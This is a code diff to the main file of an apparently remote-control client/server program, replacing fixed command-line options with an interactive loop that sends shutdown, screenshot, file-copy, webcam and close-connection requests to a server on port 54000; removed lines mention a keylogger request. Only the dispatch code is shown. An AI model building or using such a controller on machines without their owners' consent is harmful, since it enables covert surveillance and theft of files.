@@ -2,28 +2,19 @@
 #include "server_socket.h"
 // #include "GmailClient.h"
 #include <iostream>
+#include <sstream>
+
+void handleDemand(std::string demands[10], std::string demand)
+{
+    std::stringstream ss(demand.c_str());
+
+    int i = 0;
+    while (ss >> demands[i++]){}
+    i--;
+    demands[i] = "end!";
+}
 
 int main(int argc, char* argv[]) {
-
-    // if (argc == 2 && std::string(argv[1]) == "server") {
-    //     // Start server
-    //     Server server(8083);
-    //     if (server.start()) {
-    //         server.listenForConnections();  // Synchronously listen for connections
-    //     }
-    // } else if (argc == 2 && std::string(argv[1]) == "client") {
-    //     // Start client
-    //     Client client("10.123.0.76", 8083);
-    //     if (client.connectToServer()) {
-    //         // client.sendShutdownRequest();
-    //         client.sendKeyloggerRequest();
-    //     }
-        
-    // } else {
-    //     std::cerr << "Usage: " << argv[0] << " [server | client]" << std::endl;
-    // }
-
-
     if (std::string(argv[1]) == "server") {
         // Start server
         Server server(54000);
@@ -34,14 +25,25 @@ int main(int argc, char* argv[]) {
         // Start client
         Client client(std::string(argv[2]), 54000);
         if (client.connectToServer()) {
-            if (std::string(argv[3]) == "shutdown") client.sendShutdownRequest();
-            if (std::string(argv[3]) == "screenshot") client.sendScreenshotRequest();
-            if (std::string(argv[3]) == "copyfile") client.sendFileCopyRequest(std::string(argv[4]), std::string(argv[5]));
-            if (std::string(argv[3]) == "openwebcam") client.sendWebcamRequest();
-            // for (int i = 0; i < 2000000000; i++){}
-            // client.sendCloseWebcamRequest();
-            // client.sendStartWebcamRequest();
-            // client.sendStopWebcamRequest();
+            std::string endflag = "end!", demands[10], demand;
+            while (1)
+            {
+                std::cout << "Enter the demand: ";
+                std::getline(std::cin, demand);
+                handleDemand(demands, demand);
+
+                if (demands[0] == "shutdown" && demands[1] == endflag) client.sendShutdownRequest();
+                if (demands[0] == "screenshot" && demands[1] == endflag) client.sendScreenshotRequest();
+                if (demands[0] == "copyfile" && demands[3] == endflag) client.sendFileCopyRequest(demands[1], demands[2]);
+                if (demands[0] == "webcam" && demands[1] == endflag) client.sendWebcamRequest();
+                if (demands[0] == "closeconnection" && demands[1] == endflag) {
+                    client.sendCloseConnection();
+                    break;
+                }
+                // client.sendCloseWebcamRequest();
+                // client.sendStartWebcamRequest();
+                // client.sendStopWebcamRequest();
+            }
         }
     } else {
         std::cerr << "Usage: " << argv[0] << " [server | client]" << std::endl;
